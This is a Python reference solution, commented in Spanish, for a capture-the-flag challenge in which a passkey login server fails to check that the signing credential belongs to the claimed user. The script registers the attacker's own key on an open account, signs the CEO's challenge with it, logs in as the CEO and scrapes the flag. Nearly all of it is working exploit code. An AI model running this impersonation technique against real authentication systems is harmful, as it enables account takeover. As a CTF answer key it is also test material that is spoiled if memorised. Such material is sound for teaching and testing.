"""
Solucion de referencia del CTF "Passwordless de Carton" (HackerBank).

El servidor no guarda ninguna clave privada (como FIDO2 real), asi que no hay
nada que "robar". El fallo es de AUTORIZACION: /auth/verify no comprueba que la
credencial que firma pertenezca al usuario que se reclama (falta de binding).

Ataque:
  1. Genero MI propio par de claves (la privada nunca sale de aca).
  2. Registro MI passkey en una cuenta con registro abierto (alumno).
  3. Pido un challenge del CEO y lo firmo con MI clave privada.
  4. Lo envio a /auth/verify diciendo que soy el CEO, pero presentando MI
     credential_id -> el server valida mi firma y, al no chequear el binding,
     me deja entrar como el CEO.

Requisitos:  pip install requests cryptography
Uso:         python solve.py            (usa http://localhost:5000 por defecto)
             python solve.py http://host:5000
"""
import re
import sys

import requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:5000"

REGISTER_ON = "alumno"    # cuenta con registro abierto donde dejo mi passkey
TARGET = "ceo"            # a quien me quiero hacer pasar


def raw_signature(private_key, challenge: str) -> str:
    """Firma el challenge y devuelve la firma en formato raw r||s (64 bytes) hex
    (el mismo que produce WebCrypto y el que espera el servidor)."""
    der = private_key.sign(challenge.encode("utf-8"), ec.ECDSA(hashes.SHA256()))
    r, s = decode_dss_signature(der)
    return (r.to_bytes(32, "big") + s.to_bytes(32, "big")).hex()


def main():
    s = requests.Session()

    # --- 1) Genero mi propio par de claves (la privada se queda conmigo) ---
    priv = ec.generate_private_key(ec.SECP256R1())
    pub_pem = priv.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    ).decode("ascii")
    my_credential_id = "attacker-" + priv.private_numbers().private_value.to_bytes(32, "big").hex()[:24]

    # --- 2) Registro MI passkey en una cuenta con registro abierto ---
    reg = s.post(f"{BASE}/auth/register", json={
        "username": REGISTER_ON,
        "credential_id": my_credential_id,
        "public_key": pub_pem,
    }).json()
    if not reg.get("ok"):
        print(f"[!] No se pudo registrar la passkey: {reg}")
        return
    print(f"[1] Passkey propia registrada en '{REGISTER_ON}' (credential_id={my_credential_id})")

    # --- 3) Pido un challenge del CEO y lo firmo con MI clave ---
    ch = s.post(f"{BASE}/auth/challenge", json={"username": TARGET}).json()
    challenge = ch["challenge"]
    print(f"[2] Challenge del CEO: {challenge}")
    signature = raw_signature(priv, challenge)
    print(f"[3] Challenge firmado con MI clave (raw r||s): {signature[:32]}...")

    # --- 4) Verify diciendo que soy el CEO, pero con MI credential_id ---
    verify = s.post(f"{BASE}/auth/verify", json={
        "username": TARGET,
        "credential_id": my_credential_id,   # <- credencial de OTRO usuario
        "challenge": challenge,
        "signature": signature,
    }).json()
    if not verify.get("ok"):
        print(f"[!] Falló la verificación: {verify}")
        return
    print(f"[4] Autenticados como el CEO. Redirige a: {verify['next']}")

    # --- Leer el codigo ganador desde el dashboard del CEO ---
    dashboard = s.get(f"{BASE}{verify['next']}").text
    match = re.search(r"flag-code[^>]*>\s*([0-9a-f]{32})\s*<", dashboard)
    flag = match.group(1) if match else "(no encontrada en el HTML)"
    print(f"\n>>> CODIGO GANADOR: {flag}")


if __name__ == "__main__":
    main()
